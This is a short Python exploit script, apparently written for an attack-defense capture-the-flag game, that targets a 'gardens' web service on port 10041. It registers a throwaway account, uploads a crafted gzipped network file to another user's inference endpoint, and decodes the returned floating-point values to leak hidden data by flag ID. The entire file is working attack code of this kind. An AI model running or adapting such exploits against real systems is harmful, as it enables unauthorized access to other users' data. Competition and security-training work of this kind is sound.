#!/usr/bin/python3
import gzip
import random
import string
import struct
import sys

import hexdump
import requests


# Arbitrary variable retrieval with weather layer

def exploit(ip, flag_id):
    s = requests.Session()

    username = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    s.post(f'http://{ip}:10041/register', params={'username': username, 'password': password})

    with open('exploit2_2_network.txt', 'rb') as f:
        network = f.read()

    network_gzip = gzip.compress(network)
    r = s.post(
        f'http://{ip}:10041/gardens/{flag_id}/infer',
        files={'network': network_gzip},
    )
    j = r.json()

    # s = j['stdout']
    # print(gzip.decompress(base64.b64decode(s.replace('_', '/').replace('-', '+').encode() + b'=' * (-len(s) % 4))).decode())

    # print(j['result'])
    decoded = b""
    for f in j['result']:
        decoded += struct.pack("<d", f)
    print(hexdump.hexdump(decoded))


if __name__ == '__main__':
    if len(sys.argv) != 3:
        sys.stderr.write('Usage: ./exploit2_2.py IP FLAG_ID\n')
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2])
